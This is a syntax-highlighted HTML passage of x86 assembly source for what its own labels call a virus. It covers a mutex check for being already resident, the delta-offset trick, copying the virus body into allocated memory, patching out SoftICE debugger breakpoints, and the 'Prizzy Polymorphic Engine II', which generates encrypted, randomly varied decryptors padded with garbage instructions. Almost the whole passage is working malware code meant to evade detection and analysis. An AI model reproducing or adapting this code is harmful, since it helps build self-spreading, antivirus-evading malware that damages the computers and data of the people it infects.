        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;calculate strlen(string)+1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;filename in unicode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;no composite characters</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CP_ACP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddWideCharToMultiByte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Create mutex or get "already resident" flag.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output: (C)arry flag</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">create_mutex</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto_mutex</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;mutex name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">;owner</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;mutex attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCreateMutexA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetLastError</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;already resident ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cm_finish</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddReleaseMutex</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__cm_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.access_eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;already resident ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cm_failed</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__cm_failed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ getting address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get delta offset to EBP. The second SUB instruction sub-</span><span class="sc0">
        </span><span class="sc1">;tract "virus_start". So then I can only use:</span><span class="sc0">
        </span><span class="sc1">;     *  LEA   EAX,[EBP+pe_header]</span><span class="sc0">
        </span><span class="sc1">;instead</span><span class="sc0">
        </span><span class="sc1">;     *  LEA   EAX,[EBP+pe_header - virus_start]</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">get_base_ebp</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">;get address where we're</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ Prizzy Polymorphic Engine II (PPE-II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function generate polymorphic engine with:</span><span class="sc0">
        </span><span class="sc1">;    * brute-attack algorithm</span><span class="sc0">
        </span><span class="sc1">;    * random multi-layer engine</span><span class="sc0">
        </span><span class="sc1">;Please find "ppe_*" functions to know more, thanks.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__ppe_st_flags</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;input of tbl_encode_loop</span><span class="sc0">
        </span><span class="sc5">__ppe_st_items</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;items in table</span><span class="sc0">
        </span><span class="sc5">__ppe_st_o_table</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;offset to the table (part)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_startup</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; save all registers</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; clear tables of (base-register / garbages / JNZ ... )</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc0">      </span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc0">   </span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__pllg_memory</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">

        </span><span class="sc1">; set style of garbages (based+flags)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">USED_FLAGS</span><span class="sc0">

        </span><span class="sc1">; copy virus body to the allocated memory</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">file_size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc1">; clear two SoftICE final breakpoints</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">__final_SoftICE_1</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">__final_SoftICE_2</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">9090h</span><span class="sc0">

        </span><span class="sc1">; load address of the start of poly-decoder</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; clear table</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_encode_loop</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppes_clear_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc5">__ppes_clear_item</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_clear_item</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_clear_table</span><span class="sc0">

        </span><span class="sc1">; get global_index_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; get index_reg --&gt; (xor,sub...) [index_reg], reg32</span><span class="sc0">
    </span><span class="sc5">__ppes_new_ireg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">        </span><span class="sc1">;EBP isn't supported</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_new_ireg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; get code reg --&gt; (xor,sub...) [---], code_reg</span><span class="sc0">
    </span><span class="sc5">__ppes_new_creg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000100b</span><span class="sc0">        </span><span class="sc1">;only 8 bits reg</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_new_creg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc1">; get mlayer pointer --&gt; mov reg8, [gl_index_reg+mpointer]</span><span class="sc0">
    </span><span class="sc5">__ppes_new_lreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">        </span><span class="sc1">;EBP isn't supported</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_new_lreg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mlayer_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; generate initial code value</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">code_value_add</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; select style (add/sub/xor)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_style</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; clear used registers (this isn't right time)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc1">; choose subroutine</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_encode_loop</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__ppes_choose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;AH=random?, AL=items</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">;random ? JZ if not</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_crun</span><span class="sc0">
    </span><span class="sc5">__ppes_cnext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_cnext</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__ppes_crun</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">;already generated byte...</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;already generated flag</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_ccmp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_flags</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__ppes_cnext</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppes_crun</span><span class="sc0">
    </span><span class="sc5">__ppes_ccmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_o_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__ppe_st_items</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000008h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ppes_choose</span><span class="sc0">

        </span><span class="sc1">; finishing (PPE-II)...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_finish</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ polymorphic garbages PPE-II ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄ´ generate some garbages code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This main function generates garbages from my great table</span><span class="sc0">
        </span><span class="sc1">;Function can be recursived but it  cannot  generate copro</span><span class="sc0">
        </span><span class="sc1">;garbages yet. You can  set (garbage_style) if you want to</span><span class="sc0">
        </span><span class="sc1">;generate unmodify flags instructions.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gen_garbage</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__gg_exit</span><span class="sc0">

        </span><span class="sc1">; are registers full ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc2">0EFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gg_exit</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__gg_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; have I use unmodify flags instructions ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">],</span><span class="sc5">USED_FLAGS</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggl_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_no_flags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_no_flags</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
